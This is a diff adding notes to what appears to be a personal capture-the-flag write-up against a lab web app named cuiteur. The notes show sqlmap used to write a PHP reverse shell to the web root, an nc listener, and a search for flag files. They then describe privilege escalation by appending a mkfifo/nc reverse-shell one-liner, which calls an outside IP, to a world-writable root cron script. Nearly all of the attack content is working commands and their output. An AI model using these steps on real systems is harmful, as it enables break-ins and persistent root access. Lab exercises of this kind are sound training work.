@@ -76,16 +76,47 @@ sqlmap -r albert.txt --dump  -T flags -D cuiteur
 ------------------------------------------------------------------------------------
 
 flag{3b2000}:
+http://10.0.2.233/php/reverse-shell.php
 used sqlmap to upload php-reverse-shell.php
 sqlmap -r albert.txt --file-write=./php-reverse-shell.php --file-dest=/var/www/html/php/reverse-shell.php
-
+reload the webpage http://10.0.2.233/php/reverse-shell.php
 nc -lvnp 2424
  find / -type f -name flag{* 2>/dev/null
 
 /var/www/html/flag{3b2000b9c6cb4f72bdea7affa125b875113ab85283e8ea}.jpg
 
+----------------------------------------------------------------------------------------------------------
 
 
+
+
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
+cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+ls -la /etc/cron*
+-rwxrw-rw-   1 www-data www-data  249 Feb 10 13:05 cuiteur-cleaning
+cuiteur-cleaning made it possible to use as a script. 
+
+
+ cat /etc/cron.hourly/cuiteur-cleaning
+#!/bin/bash
+/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
+/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
+
+echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f" >>/etc/cron.hourly/cuiteur-cleaning
+$ cat /etc/cron.hourly/cuiteur-cleaning
+#!/bin/bash
+/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
+/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f
 
 
 
